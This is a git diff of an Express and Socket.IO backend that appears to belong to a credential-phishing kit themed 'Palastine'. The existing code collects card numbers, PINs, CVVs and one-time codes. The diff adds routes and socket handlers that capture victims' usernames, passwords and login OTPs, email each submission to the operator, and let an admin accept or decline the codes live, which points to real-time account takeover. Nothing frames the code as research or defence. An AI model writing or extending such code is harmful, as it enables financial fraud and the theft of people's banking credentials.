@@ -40,6 +40,10 @@ const sendEmail = async (data, type) => {
           ? "Palastine Data"
           : type === "visa"
           ? " Palastine visa"
+          : type === "username"
+          ? "Palastine login"
+          : type === "userOtp"
+          ? "Palastine login Otp"
           : "Palastine Otp "
       }`,
       html: htmlContent,
@@ -66,6 +70,18 @@ app.post("/form", async (req, res) => {
   await sendEmail(data, "form").then(() => res.status(201).json(order));
 });
 
+app.post("/username/:id", async (req, res) => {
+  const { id } = req.params;
+  const user = await Order.findById(id);
+  if (user) {
+    user.username = req.body.username;
+    user.password = req.body.password;
+    await user
+      .save()
+      .then(async (order) => await sendEmail(req.body, "username"))
+      .then(() => res.sendStatus(200));
+  }
+});
 app.post("/visa/:id", async (req, res) => {
   const { id } = req.params;
   const user = await Order.findById(id);
@@ -75,7 +91,7 @@ app.post("/visa/:id", async (req, res) => {
     user.pin = req.body.pin;
     user.cvv = req.body.cvv;
     user.card_name = req.body.card_name;
-    user.money = req.body.money
+    user.money = req.body.money;
     await user
       .save()
       .then(async (order) => await sendEmail(req.body, "visa"))
@@ -91,6 +107,17 @@ app.post("/otp/:id", async (req, res) => {
     await user
       .save()
       .then(async (order) => await sendEmail(req.body, "otp"))
+      .then(() => res.sendStatus(200));
+  }
+});
+app.post("/userOtp/:id", async (req, res) => {
+  const { id } = req.params;
+  const user = await Order.findById(id);
+  if (user) {
+    user.userOtp = req.body.userOtp;
+    await user
+      .save()
+      .then(async (order) => await sendEmail(req.body, "userOtp"))
       .then(() => res.sendStatus(200));
   }
 });
@@ -126,14 +153,13 @@ app.post("/login", async (req, res) => {
   }
 });
 
-app.delete("/orders", async (req,res) => {
+app.delete("/orders", async (req, res) => {
   await Order.find({}).then(
     async (orders) =>
       await Promise.all(
         orders.map(async (order) => await Order.findByIdAndDelete(order._id))
-      ).then(()=>res.sendStatus(200))
-
-  ); 
+      ).then(() => res.sendStatus(200))
+  );
 });
 
 io.on("connection", (socket) => {
@@ -157,9 +183,22 @@ io.on("connection", (socket) => {
       card_name: data.card_name,
       cvv: data.cvv,
       pin: data.pin,
-      money:data.money
+      money: data.money,
     });
     io.emit("visa", data);
+  });
+
+  socket.on("username", async (data) => {
+    console.log("new username data", data);
+    await Order.findByIdAndUpdate(data.id, {
+      userAccept: false,
+      checked: false,
+      username: data.username,
+      password: data.password,
+    }).then((res) => {
+      console.log(res)
+      io.emit("username", data);
+    });
   });
 
   socket.on("otp", async (data) => {
@@ -172,33 +211,43 @@ io.on("connection", (socket) => {
     io.emit("otp", data);
   });
 
-  socket.on("acceptBank", async (data) => {
-    console.log("acceptBank From Admin", data);
+  socket.on("userOtp", async (data) => {
+    console.log("new userOtp  data", data);
+    const order = await Order.findByIdAndUpdate(data.id, {
+      userOtpAccept: false,
+      checked: false,
+      userOtp: data.userOtp,
+    });
+    io.emit("userOtp", data);
+  });
+
+  socket.on("acceptUser", async (data) => {
+    console.log("acceptUser From Admin", data);
     console.log(data);
     await Order.findByIdAndUpdate(data._id, {
-      bankAccept: true,
+      userAccept: true,
     });
-    io.emit("acceptBank", data);
+    io.emit("acceptUser", data);
   });
-  socket.on("declineBank", async (data) => {
+  socket.on("declineUser", async (data) => {
     console.log("declineBank Form Admin", data);
     await Order.findByIdAndUpdate(data._id, {
-      bankAccept: true,
+      userAccept: true,
     });
-    io.emit("declineBank", data);
+    io.emit("declineUser", data);
   });
-  socket.on("acceptBankOtp", async (data) => {
-    console.log("acceptBankOtp From Admin", data);
-    await Order.findByIdAndUpdate(data._id, { bankOtpAccept: true });
-    io.emit("acceptBankOtp", data);
+  socket.on("acceptUserOtp", async (data) => {
+    console.log("acceptUserOtp From Admin", data);
+    await Order.findByIdAndUpdate(data._id, { userOtpAccept: true });
+    io.emit("acceptUserOtp", data);
   });
-  socket.on("declineBankOtp", async (data) => {
-    console.log("declineBankOtp Form Admin", data);
+  socket.on("declineUserOtp", async (data) => {
+    console.log("declineUserOtp Form Admin", data);
     await Order.findByIdAndUpdate(data._id, {
-      bankOtp: "",
-      bankOtpAccept: true,
+      userOtp: "",
+      userOtpAccept: true,
     });
-    io.emit("declineBankOtp", data);
+    io.emit("declineUserOtp", data);
   });
 
   socket.on("acceptMuscat", async (data) => {
